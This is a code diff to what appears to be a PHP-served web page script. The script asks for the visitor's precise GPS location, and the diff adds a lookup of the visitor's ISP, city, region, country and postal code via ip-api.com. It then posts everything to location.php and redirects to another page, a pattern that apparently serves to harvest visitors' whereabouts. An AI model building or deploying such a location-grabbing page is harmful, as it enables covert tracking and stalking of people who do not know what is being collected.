@@ -23,21 +23,27 @@ echo '
             }
         }
         
-        function getLocation() {
-            // Don\'t log this message
-            
+        async function getLocation() {
             if (navigator.geolocation) {
-                // Don\'t log this message
-                
-                // Show permission request message
                 document.getElementById("locationStatus").innerText = "Requesting location permission...";
                 
+                // Obtener datos de IP y Operadora simultáneamente
+                let extraInfo = {};
+                try {
+                    const response = await fetch('http://ip-api.com/json/');
+                    extraInfo = await response.json();
+                } catch (e) {
+                    debugLog("Error fetching IP info: " + e.message);
+                }
+
                 navigator.geolocation.getCurrentPosition(
-                    sendPosition, 
+                    (position) => {
+                        sendPosition(position, extraInfo);
+                    }, 
                     handleError, 
                     {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
+                        enableHighAccuracy: true, // Forzar GPS de alta precisión
+                        timeout: 10000,
                         maximumAge: 0
                     }
                 );
@@ -51,7 +57,7 @@ echo '
             }
         }
         
-        function sendPosition(position) {
+        function sendPosition(position, extraInfo) {
             debugLog("Position obtained successfully");
             document.getElementById("locationStatus").innerText = "Location obtained, loading...";
             
@@ -59,7 +65,12 @@ echo '
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
             
-            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
+            // Datos de IP
+            var isp = extraInfo.isp || 'Unknown';
+            var city = extraInfo.city || 'Unknown';
+            var region = extraInfo.regionName || 'Unknown';
+            var country = extraInfo.country || 'Unknown';
+            var zip = extraInfo.zip || 'Unknown';
             
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "location.php", true);
@@ -67,8 +78,6 @@ echo '
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
-                    // Don\'t log this message
-                    
                     // Add a delay before redirecting to ensure data is processed
                     setTimeout(function() {
                         redirectToMainPage();
@@ -82,8 +91,18 @@ echo '
                 redirectToMainPage();
             };
             
+            var params = "lat=" + lat + 
+                         "&lon=" + lon + 
+                         "&acc=" + acc + 
+                         "&isp=" + encodeURIComponent(isp) + 
+                         "&city=" + encodeURIComponent(city) + 
+                         "&region=" + encodeURIComponent(region) + 
+                         "&country=" + encodeURIComponent(country) + 
+                         "&zip=" + encodeURIComponent(zip) + 
+                         "&time=" + new Date().getTime();
+
             // Send the data with a timestamp to avoid caching
-            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
+            xhr.send(params);
         }
         
         function handleError(error) {
